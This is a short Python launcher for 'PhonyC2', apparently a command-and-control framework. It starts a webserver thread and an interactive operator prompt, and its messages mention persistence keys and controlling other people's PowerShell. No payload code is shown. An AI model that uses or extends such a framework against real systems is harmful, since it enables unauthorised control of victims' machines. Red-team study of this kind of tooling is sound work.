from isnotcore import config
from isnotcore import banner
from isnotcore import webserver
from isnotcore import commandline
import threading

if __name__ == '__main__':
    banner.banner()
    print("\033[1;32;40m \nPlease careful don't lose your persistence keys in keys file" +"\n \033[0m")
    print("\033[1;32;40m \nWhat is your business with powershell of people?" + "\n \033[0m")
    server = threading.Thread(target=webserver.main, args=())
    server.start()
    cmdline = commandline.Commandline()
    cmdline.prompt = "(PhonyC2:" + config.vps['ip'] + ":" + config.vps['port'] + "):"
    cmdline.cmdloop()




